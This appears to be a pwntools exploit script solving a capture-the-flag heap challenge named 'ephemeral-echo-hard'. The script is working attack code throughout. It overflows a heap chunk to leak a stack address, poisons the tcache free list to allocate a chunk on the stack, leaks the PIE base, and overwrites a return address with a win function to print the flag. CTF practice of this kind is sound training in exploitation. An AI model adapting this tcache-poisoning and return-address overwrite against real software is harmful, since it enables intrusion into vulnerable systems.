from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process("/challenge/ephemeral-echo-hard")
def malloc(idx,size):
    p.sendlineafter("quit):","malloc "+str(idx)+" "+str(size))
def free(idx):
    p.sendlineafter("quit):","free "+str(idx))
def scanf(idx,payload):
    p.sendlineafter("quit):","read "+str(idx)+" "+str(len(payload)))
    p.send(payload)
def echo(idx,l):
    p.sendlineafter("quit):","echo "+str(idx)+" "+str(l))
def qt():
    p.sendlineafter("quit):","quit")
def puts(idx):
    p.sendlineafter("quit):","puts "+str(idx))
def send_flag(secret):
    p.sendlineafter("quit):","send_flag")
    p.sendline(secret)
win_base=0x1400
echo_addr=0x19a5
l=32
l2=100
malloc(1,l)
malloc(0,l)
free(0)
echo(1,0)
scanf(1,b'a'*56)
echo(1,0)
p.recvuntil(b'a'*56,drop=True)
stack_addr=u64(p.recv(6)+b'\x00\x00')+22
print("[+]Stack_addr:",hex(stack_addr))
malloc(0,l2)
malloc(1,l2)
malloc(2,l2)
free(0)
free(2)
scanf(1,b'a'*112+p64(stack_addr))
malloc(0,l2)
malloc(0,l2)
echo(0,0)
p.recvuntil("Data: ",drop=True)
pie=u64(p.recv(6)+b'\x00\x00')-echo_addr
print("[+]PIE:",hex(pie))
scanf(0,p64(win_base+pie))
qt()
p.recvuntil("pwn",drop=True)
print(p.recv())
